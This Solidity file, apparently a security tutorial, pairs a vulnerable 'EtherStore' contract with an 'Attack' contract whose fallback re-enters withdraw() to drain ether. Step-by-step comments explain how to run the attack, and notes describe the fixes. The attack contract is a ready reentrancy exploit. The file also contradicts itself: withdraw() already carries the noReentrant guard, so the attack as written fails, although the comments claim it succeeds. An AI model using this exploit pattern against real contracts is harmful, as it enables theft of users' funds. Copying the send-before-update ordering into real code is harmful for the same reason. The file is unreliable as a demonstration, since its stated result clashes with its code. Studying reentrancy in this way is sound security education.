// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract EtherStore {
    mapping(address => uint) public balances;

    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public noReentrant {
        require(balances[msg.sender] >= _amount, "insufficient funds");

        // balances[msg.sender] -= _amount; // Solution to re-entrancy

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "failed to send ether");

        balances[msg.sender] -= _amount;
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(EtherStore _etherStore) public {
        etherStore = _etherStore;
    }

    fallback() external payable {
        if (etherStore.getBalance() >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        // first deposit a amount into Etherstore and withdraw it immediately
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}

/* 
    1. Deploy the EtherStore first
    2. EtherStore is the host and Attack is the attacker
    3. Deposit 2 ethers into EtherStore from 2 different accounts
    4. Call attack() in Attack and check the balance being updated to 3 ether. 


    Solution: 
        1. Update the state variable before you make any outside call
        2. Reentrant modifier
*/
